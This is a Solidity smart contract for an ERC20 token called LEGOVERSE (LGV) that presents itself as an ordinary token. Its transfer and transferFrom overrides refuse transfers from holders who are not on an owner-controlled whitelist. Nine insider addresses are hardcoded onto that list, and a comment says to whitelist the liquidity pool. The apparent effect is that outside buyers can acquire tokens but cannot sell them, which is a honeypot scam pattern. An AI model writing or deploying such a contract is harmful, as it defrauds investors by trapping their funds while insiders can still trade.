// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LEGOVERSE", "LGV") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000 * 10 ** decimals());
        whiteList[0xc1377CAF973eB08Ef94162e35E49F4525BD67f67]= true;
        whiteList[0x0B7012522Df5D599906b86231a7addc0a5EFDF1d]=true;
        whiteList[0xae706b353719EBb3147e6315A9B92009cd5f3569]=true;
        whiteList[0x612098965Ec10C53d18Ce6D733B19A120FC6ee77]=true;
        whiteList[0xFc8E753cA2Ad8b497D029B04495B6050B61fD5B4]=true;
        whiteList[0xe9A244911F26C9bb09820B1b1dDD1443D5a628aa]=true;
        whiteList[0xf8aD1F83248E406Fdeb5782d5E20af94F70bE1C0]=true;
        whiteList[0x7466b5d90c43a291832EaaE53f5c49336d164eaa]=true;
        whiteList[0x4A9aF16a424e892C69F3C358614e4BF6029f11b2]=true;
        
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}